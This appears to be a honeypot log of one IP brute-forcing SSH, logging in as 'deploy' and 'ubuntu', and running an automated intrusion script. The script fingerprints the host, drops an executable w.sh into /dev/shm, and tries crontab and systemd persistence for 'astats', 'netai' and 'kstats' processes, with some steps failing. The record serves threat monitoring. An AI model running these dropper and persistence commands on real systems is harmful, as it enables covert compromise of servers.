@@ -1,0 +1,3710 @@
+# merged ssh-shadow trace for ip=149.210.235.123
+# total_items=793
+
+[2026-04-18 21:45:00.182385 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:56202 | raw=Connection from 149.210.235.123 port 56202 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-18 21:45:00.204236 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:56204 | raw=Connection from 149.210.235.123 port 56204 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-18 21:45:00.774393 UTC] [-] [preauth]
+preauth:auth_failed | src=149.210.235.123:56202 | user=admin | method=password | raw=Failed password for admin from 149.210.235.123 port 56202 ssh2
+
+[2026-04-20 12:21:55.223623 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:40656 | raw=Connection from 149.210.235.123 port 40656 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-20 12:21:55.324291 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:40670 | raw=Connection from 149.210.235.123 port 40670 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-20 12:21:55.797253 UTC] [-] [preauth]
+preauth:auth_failed | src=149.210.235.123:40656 | user=admin | method=password | raw=Failed password for admin from 149.210.235.123 port 40656 ssh2
+
+[2026-04-20 16:04:13.076104 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:55390 | raw=Connection from 149.210.235.123 port 55390 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-20 16:04:13.182397 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:55406 | raw=Connection from 149.210.235.123 port 55406 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-20 16:04:13.641350 UTC] [-] [preauth]
+preauth:auth_success | src=149.210.235.123:55390 | user=deploy | method=password | raw=Accepted password for deploy from 149.210.235.123 port 55390 ssh2
+
+[2026-04-20 16:04:14.000000 UTC] [1776701054_149.210.235.123_55390_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701054_149.210.235.123_55390_sshshadow
+
+[2026-04-20 16:04:14.000010 UTC] [1776701054_149.210.235.123_55390_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=uname -a
+
+[2026-04-20 16:04:15.000000 UTC] [1776701054_149.210.235.123_55390_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 16:04:15.000000 UTC] [1776701055_149.210.235.123_55390_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701055_149.210.235.123_55390_sshshadow
+
+[2026-04-20 16:04:15.000010 UTC] [1776701055_149.210.235.123_55390_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done'
+
+[2026-04-20 16:04:15.000500 UTC] [1776701054_149.210.235.123_55390_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:04:15.199340 UTC] [1776701054_149.210.235.123_55390_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=uname -a
+
+[2026-04-20 16:04:15.361074 UTC] [1776701054_149.210.235.123_55390_sshshadow] [event]
+ssh_exec_complete | cmd=uname -a | exit_code=0 | stdout_bytes=102 | stderr_bytes=0
+
+[2026-04-20 16:04:15.361174 UTC] [1776701054_149.210.235.123_55390_sshshadow] [exec_stdout]
+exec.stdout
+Linux gcs-shadow 6.17.0-1010-aws #10~24.04.1-Ubuntu SMP Thu Mar 19 01:45:25 UTC 2026 x86_64 GNU/Linux
+
+[2026-04-20 16:04:16.927813 UTC] [1776701055_149.210.235.123_55390_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done'
+
+[2026-04-20 16:04:17.000000 UTC] [1776701055_149.210.235.123_55390_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 16:04:17.000000 UTC] [1776701057_149.210.235.123_55390_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701057_149.210.235.123_55390_sshshadow
+
+[2026-04-20 16:04:17.000010 UTC] [1776701057_149.210.235.123_55390_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cat /proc/cpuinfo | grep processor | wc -l
+
+[2026-04-20 16:04:17.000500 UTC] [1776701055_149.210.235.123_55390_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:04:17.007389 UTC] [1776701055_149.210.235.123_55390_sshshadow] [event]
+suspicious | detail=inline_exec:sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done' | severity=medium | action=observe
+
+[2026-04-20 16:04:17.095912 UTC] [1776701055_149.210.235.123_55390_sshshadow] [event]
+ssh_exec_complete | cmd=sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done' | exit_code=0 | stdout_bytes=9 | stderr_bytes=0
+
+[2026-04-20 16:04:17.096012 UTC] [1776701055_149.210.235.123_55390_sshshadow] [exec_stdout]
+exec.stdout
+/dev/shm
+
+[2026-04-20 16:04:18.735245 UTC] [1776701057_149.210.235.123_55390_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=cat /proc/cpuinfo | grep processor | wc -l
+
+[2026-04-20 16:04:18.914331 UTC] [1776701057_149.210.235.123_55390_sshshadow] [event]
+ssh_exec_complete | cmd=cat /proc/cpuinfo | grep processor | wc -l | exit_code=0 | stdout_bytes=2 | stderr_bytes=0
+
+[2026-04-20 16:04:18.914431 UTC] [1776701057_149.210.235.123_55390_sshshadow] [exec_stdout]
+exec.stdout
+2
+
+[2026-04-20 16:04:19.000000 UTC] [1776701057_149.210.235.123_55390_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 16:04:19.000000 UTC] [1776701059_149.210.235.123_55390_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701059_149.210.235.123_55390_sshshadow
+
+[2026-04-20 16:04:19.000010 UTC] [1776701059_149.210.235.123_55390_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
+
+[2026-04-20 16:04:19.000500 UTC] [1776701057_149.210.235.123_55390_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:04:20.000000 UTC] [1776701059_149.210.235.123_55390_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 16:04:20.000500 UTC] [1776701059_149.210.235.123_55390_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:04:20.559901 UTC] [1776701059_149.210.235.123_55390_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
+
+[2026-04-20 16:04:20.630828 UTC] [1776701059_149.210.235.123_55390_sshshadow] [event]
+suspicious | detail=chmod_plus_x:cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi | severity=medium | action=observe
+
+[2026-04-20 16:04:20.713919 UTC] [1776701059_149.210.235.123_55390_sshshadow] [event]
+ssh_exec_complete | cmd=cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi | exit_code=0 | stdout_bytes=0 | stderr_bytes=0
+
+[2026-04-20 16:04:21.000000 UTC] [1776701061_149.210.235.123_55390_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701061_149.210.235.123_55390_sshshadow
+
+[2026-04-20 16:04:21.000010 UTC] [1776701061_149.210.235.123_55390_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=
+CRON="$(crontab -l 2>/dev/null || true)"
+echo "$CRON" | grep -F '/dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1 || \
+  printf '%s\n%s\n' "@reboot  /dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"" "0 * * * * cd "/dev/shm" && ./w.sh "astats" "netai" "kstats" "ssh 2 ranges"" | (cat -; echo "$CRON") | crontab -
+
+[2026-04-20 16:04:22.000000 UTC] [1776701061_149.210.235.123_55390_sshshadow] [session_end]
+session_end | reason=exit_code_127
+
+[2026-04-20 16:04:22.000500 UTC] [1776701061_149.210.235.123_55390_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:04:22.370842 UTC] [1776701061_149.210.235.123_55390_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=
+CRON="$(crontab -l 2>/dev/null || true)"
+echo "$CRON" | grep -F '/dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1 || \
+  printf '%s\n%s\n' "@reboot  /dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"" "0 * * * * cd "/dev/shm" && ./w.sh "astats" "netai" "kstats" "ssh 2 ranges"" | (cat -; echo "$CRON") | crontab -
+
+[2026-04-20 16:04:22.552351 UTC] [1776701061_149.210.235.123_55390_sshshadow] [event]
+ssh_exec_complete | cmd=
+CRON="$(crontab -l 2>/dev/null || true)"
+echo "$CRON" | grep -F '/dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1 || \
+  printf '%s\n%s\n' "@reboot  /dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"" "0 * * * * cd "/dev/shm" && ./w.sh "astats" "netai" "kstats" "ssh 2 ranges"" | (cat -; echo "$CRON") | crontab -
+ | exit_code=127 | stdout_bytes=0 | stderr_bytes=46
+
+[2026-04-20 16:04:22.552551 UTC] [1776701061_149.210.235.123_55390_sshshadow] [exec_stderr]
+exec.stderr
+/bin/bash: line 4: crontab: command not found
+
+[2026-04-20 16:04:23.000000 UTC] [1776701063_149.210.235.123_55390_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701063_149.210.235.123_55390_sshshadow
+
+[2026-04-20 16:04:23.000010 UTC] [1776701063_149.210.235.123_55390_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service'
+
+[2026-04-20 16:04:24.000000 UTC] [1776701063_149.210.235.123_55390_sshshadow] [session_end]
+session_end | reason=exit_code_127
+
+[2026-04-20 16:04:24.000000 UTC] [1776701064_149.210.235.123_55390_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701064_149.210.235.123_55390_sshshadow
+
+[2026-04-20 16:04:24.000010 UTC] [1776701064_149.210.235.123_55390_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10
+
+[2026-04-20 16:04:24.000500 UTC] [1776701063_149.210.235.123_55390_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:04:24.207850 UTC] [1776701063_149.210.235.123_55390_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service'
+
+[2026-04-20 16:04:24.392031 UTC] [1776701063_149.210.235.123_55390_sshshadow] [event]
+ssh_exec_complete | cmd=sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service' | exit_code=127 | stdout_bytes=0 | stderr_bytes=28
+
+[2026-04-20 16:04:24.392231 UTC] [1776701063_149.210.235.123_55390_sshshadow] [exec_stderr]
+exec.stderr
+sh: 1: systemctl: not found
+
+[2026-04-20 16:04:26.000000 UTC] [1776701064_149.210.235.123_55390_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 16:04:26.000000 UTC] [1776701066_149.210.235.123_55390_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701066_149.210.235.123_55390_sshshadow
+
+[2026-04-20 16:04:26.000010 UTC] [1776701066_149.210.235.123_55390_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=ps aux | grep astats | grep -v grep | wc -l
+
+[2026-04-20 16:04:26.000500 UTC] [1776701064_149.210.235.123_55390_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:04:26.047792 UTC] [1776701064_149.210.235.123_55390_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10
+
+[2026-04-20 16:04:26.255639 UTC] [1776701064_149.210.235.123_55390_sshshadow] [event]
+ssh_exec_complete | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10 | exit_code=0 | stdout_bytes=186 | stderr_bytes=0
+
+[2026-04-20 16:04:26.255739 UTC] [1776701064_149.210.235.123_55390_sshshadow] [exec_stdout]
+exec.stdout
+    PID %CPU COMMAND
+  21295 37.5 strace
+  21300 33.3 ps
+  20802  0.2 sshd
+    249  0.0 python3
+    248  0.0 sshd
+      1  0.0 bash
+  20805  0.0 sshd
+  21247  0.0 bash
+  21289  0.0 bash
+
+[2026-04-20 16:04:27.835565 UTC] [1776701066_149.210.235.123_55390_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=ps aux | grep astats | grep -v grep | wc -l
+
+[2026-04-20 16:04:28.000000 UTC] [1776701066_149.210.235.123_55390_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 16:04:28.000000 UTC] [1776701068_149.210.235.123_55390_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701068_149.210.235.123_55390_sshshadow
+
+[2026-04-20 16:04:28.000010 UTC] [1776701068_149.210.235.123_55390_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 16:04:28.000500 UTC] [1776701066_149.210.235.123_55390_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:04:28.004905 UTC] [1776701066_149.210.235.123_55390_sshshadow] [event]
+ssh_exec_complete | cmd=ps aux | grep astats | grep -v grep | wc -l | exit_code=0 | stdout_bytes=2 | stderr_bytes=0
+
+[2026-04-20 16:04:28.005005 UTC] [1776701066_149.210.235.123_55390_sshshadow] [exec_stdout]
+exec.stdout
+0
+
+[2026-04-20 16:04:29.564261 UTC] [1776701068_149.210.235.123_55390_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 16:04:29.702139 UTC] [1776701068_149.210.235.123_55390_sshshadow] [event]
+ssh_exec_complete | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats | exit_code=1 | stdout_bytes=0 | stderr_bytes=45
+
+[2026-04-20 16:04:29.702339 UTC] [1776701068_149.210.235.123_55390_sshshadow] [exec_stderr]
+exec.stderr
+/bin/bash: line 1: astats: Permission denied
+
+[2026-04-20 16:04:30.000000 UTC] [1776701068_149.210.235.123_55390_sshshadow] [session_end]
+session_end | reason=exit_code_1
+
+[2026-04-20 16:04:30.000500 UTC] [1776701068_149.210.235.123_55390_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:04:31.000000 UTC] [1776701071_149.210.235.123_55390_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701071_149.210.235.123_55390_sshshadow
+
+[2026-04-20 16:04:31.000010 UTC] [1776701071_149.210.235.123_55390_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 16:04:32.925013 UTC] [1776701071_149.210.235.123_55390_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 16:04:33.000000 UTC] [1776701071_149.210.235.123_55390_sshshadow] [session_end]
+session_end | reason=exit_code_1
+
+[2026-04-20 16:04:33.000500 UTC] [1776701071_149.210.235.123_55390_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:04:33.097146 UTC] [1776701071_149.210.235.123_55390_sshshadow] [event]
+ssh_exec_complete | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats | exit_code=1 | stdout_bytes=0 | stderr_bytes=45
+
+[2026-04-20 16:04:33.097346 UTC] [1776701071_149.210.235.123_55390_sshshadow] [exec_stderr]
+exec.stderr
+/bin/bash: line 1: astats: Permission denied
+
+[2026-04-20 16:04:34.000000 UTC] [1776701074_149.210.235.123_55390_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701074_149.210.235.123_55390_sshshadow
+
+[2026-04-20 16:04:34.000010 UTC] [1776701074_149.210.235.123_55390_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 16:04:35.000000 UTC] [1776701074_149.210.235.123_55390_sshshadow] [session_end]
+session_end | reason=exit_code_1
+
+[2026-04-20 16:04:35.000500 UTC] [1776701074_149.210.235.123_55390_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:04:35.260891 UTC] [1776701074_149.210.235.123_55390_sshshadow] [command]
+ssh_exec | cwd=/home/deploy | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 16:04:35.398143 UTC] [1776701074_149.210.235.123_55390_sshshadow] [event]
+ssh_exec_complete | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats | exit_code=1 | stdout_bytes=0 | stderr_bytes=45
+
+[2026-04-20 16:04:35.398343 UTC] [1776701074_149.210.235.123_55390_sshshadow] [exec_stderr]
+exec.stderr
+/bin/bash: line 1: astats: Permission denied
+
+[2026-04-20 16:04:38.696150 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:33300 | raw=Connection from 149.210.235.123 port 33300 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-20 16:04:38.798583 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:33306 | raw=Connection from 149.210.235.123 port 33306 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-20 16:04:39.000000 UTC] [1776701079_149.210.235.123_33300_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701079_149.210.235.123_33300_sshshadow
+
+[2026-04-20 16:04:39.000010 UTC] [1776701079_149.210.235.123_33300_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=uname -a
+
+[2026-04-20 16:04:39.269467 UTC] [-] [preauth]
+preauth:auth_success | src=149.210.235.123:33300 | user=ubuntu | method=password | raw=Accepted password for ubuntu from 149.210.235.123 port 33300 ssh2
+
+[2026-04-20 16:04:40.865811 UTC] [1776701079_149.210.235.123_33300_sshshadow] [command]
+ssh_exec | cwd=/home/ubuntu | cmd=uname -a
+
+[2026-04-20 16:04:41.000000 UTC] [1776701079_149.210.235.123_33300_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 16:04:41.000000 UTC] [1776701081_149.210.235.123_33300_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701081_149.210.235.123_33300_sshshadow
+
+[2026-04-20 16:04:41.000010 UTC] [1776701081_149.210.235.123_33300_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done'
+
+[2026-04-20 16:04:41.000500 UTC] [1776701079_149.210.235.123_33300_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:04:41.007344 UTC] [1776701079_149.210.235.123_33300_sshshadow] [event]
+ssh_exec_complete | cmd=uname -a | exit_code=0 | stdout_bytes=102 | stderr_bytes=0
+
+[2026-04-20 16:04:41.007443 UTC] [1776701079_149.210.235.123_33300_sshshadow] [exec_stdout]
+exec.stdout
+Linux gcs-shadow 6.17.0-1010-aws #10~24.04.1-Ubuntu SMP Thu Mar 19 01:45:25 UTC 2026 x86_64 GNU/Linux
+
+[2026-04-20 16:04:42.558418 UTC] [1776701081_149.210.235.123_33300_sshshadow] [command]
+ssh_exec | cwd=/home/ubuntu | cmd=sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done'
+
+[2026-04-20 16:04:42.631270 UTC] [1776701081_149.210.235.123_33300_sshshadow] [event]
+suspicious | detail=inline_exec:sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done' | severity=medium | action=observe
+
+[2026-04-20 16:04:42.726337 UTC] [1776701081_149.210.235.123_33300_sshshadow] [event]
+ssh_exec_complete | cmd=sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done' | exit_code=0 | stdout_bytes=9 | stderr_bytes=0
+
+[2026-04-20 16:04:42.726437 UTC] [1776701081_149.210.235.123_33300_sshshadow] [exec_stdout]
+exec.stdout
+/dev/shm
+
+[2026-04-20 16:04:43.000000 UTC] [1776701081_149.210.235.123_33300_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 16:04:43.000000 UTC] [1776701083_149.210.235.123_33300_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701083_149.210.235.123_33300_sshshadow
+
+[2026-04-20 16:04:43.000010 UTC] [1776701083_149.210.235.123_33300_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cat /proc/cpuinfo | grep processor | wc -l
+
+[2026-04-20 16:04:43.000500 UTC] [1776701081_149.210.235.123_33300_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:04:44.000000 UTC] [1776701083_149.210.235.123_33300_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 16:04:44.000500 UTC] [1776701083_149.210.235.123_33300_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:04:44.430752 UTC] [1776701083_149.210.235.123_33300_sshshadow] [command]
+ssh_exec | cwd=/home/ubuntu | cmd=cat /proc/cpuinfo | grep processor | wc -l
+
+[2026-04-20 16:04:44.598039 UTC] [1776701083_149.210.235.123_33300_sshshadow] [event]
+ssh_exec_complete | cmd=cat /proc/cpuinfo | grep processor | wc -l | exit_code=0 | stdout_bytes=2 | stderr_bytes=0
+
+[2026-04-20 16:04:44.598139 UTC] [1776701083_149.210.235.123_33300_sshshadow] [exec_stdout]
+exec.stdout
+2
+
+[2026-04-20 16:04:45.000000 UTC] [1776701085_149.210.235.123_33300_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701085_149.210.235.123_33300_sshshadow
+
+[2026-04-20 16:04:45.000010 UTC] [1776701085_149.210.235.123_33300_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
+
+[2026-04-20 16:04:46.000000 UTC] [1776701085_149.210.235.123_33300_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 16:04:46.000500 UTC] [1776701085_149.210.235.123_33300_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:04:46.338665 UTC] [1776701085_149.210.235.123_33300_sshshadow] [command]
+ssh_exec | cwd=/home/ubuntu | cmd=cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
+
+[2026-04-20 16:04:46.420410 UTC] [1776701085_149.210.235.123_33300_sshshadow] [event]
+suspicious | detail=chmod_plus_x:cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi | severity=medium | action=observe
+
+[2026-04-20 16:04:46.497658 UTC] [1776701085_149.210.235.123_33300_sshshadow] [event]
+ssh_exec_complete | cmd=cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi | exit_code=0 | stdout_bytes=0 | stderr_bytes=0
+
+[2026-04-20 16:04:47.000000 UTC] [1776701087_149.210.235.123_33300_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701087_149.210.235.123_33300_sshshadow
+
+[2026-04-20 16:04:47.000010 UTC] [1776701087_149.210.235.123_33300_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=
+CRON="$(crontab -l 2>/dev/null || true)"
+echo "$CRON" | grep -F '/dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1 || \
+  printf '%s\n%s\n' "@reboot  /dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"" "0 * * * * cd "/dev/shm" && ./w.sh "astats" "netai" "kstats" "ssh 2 ranges"" | (cat -; echo "$CRON") | crontab -
+
+[2026-04-20 16:04:48.000000 UTC] [1776701087_149.210.235.123_33300_sshshadow] [session_end]
+session_end | reason=exit_code_127
+
+[2026-04-20 16:04:48.000500 UTC] [1776701087_149.210.235.123_33300_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:04:48.327149 UTC] [1776701087_149.210.235.123_33300_sshshadow] [command]
+ssh_exec | cwd=/home/ubuntu | cmd=
+CRON="$(crontab -l 2>/dev/null || true)"
+echo "$CRON" | grep -F '/dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1 || \
+  printf '%s\n%s\n' "@reboot  /dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"" "0 * * * * cd "/dev/shm" && ./w.sh "astats" "netai" "kstats" "ssh 2 ranges"" | (cat -; echo "$CRON") | crontab -
+
+[2026-04-20 16:04:48.534075 UTC] [1776701087_149.210.235.123_33300_sshshadow] [event]
+ssh_exec_complete | cmd=
+CRON="$(crontab -l 2>/dev/null || true)"
+echo "$CRON" | grep -F '/dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1 || \
+  printf '%s\n%s\n' "@reboot  /dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"" "0 * * * * cd "/dev/shm" && ./w.sh "astats" "netai" "kstats" "ssh 2 ranges"" | (cat -; echo "$CRON") | crontab -
+ | exit_code=127 | stdout_bytes=0 | stderr_bytes=46
+
+[2026-04-20 16:04:48.534275 UTC] [1776701087_149.210.235.123_33300_sshshadow] [exec_stderr]
+exec.stderr
+/bin/bash: line 4: crontab: command not found
+
+[2026-04-20 16:04:49.000000 UTC] [1776701089_149.210.235.123_33300_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701089_149.210.235.123_33300_sshshadow
+
+[2026-04-20 16:04:49.000010 UTC] [1776701089_149.210.235.123_33300_sshshadow] [ssh_original_command]
